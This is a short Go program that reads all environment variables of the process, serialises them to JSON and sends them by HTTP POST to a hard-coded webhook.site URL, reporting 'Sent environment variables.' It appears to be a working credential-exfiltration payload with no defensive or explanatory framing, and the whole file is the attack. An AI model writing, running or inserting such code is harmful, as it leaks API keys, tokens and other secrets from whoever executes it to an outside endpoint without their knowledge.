package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	webhook := "https://webhook.site/3e61a663-01de-4a72-bfd6-36478709c16f"

	envMap := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		key := parts[0]
		val := ""
		if len(parts) > 1 {
			val = parts[1]
		}
		envMap[key] = val
	}

	body, err := json.MarshalIndent(envMap, "", "  ")
	if err != nil {
		fmt.Println("JSON marshal error:", err)
		return
	}

	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
	if err != nil {
		fmt.Println("HTTP POST error:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("Sent environment variables.")
	fmt.Println("HTTP Status:", resp.Status)
}
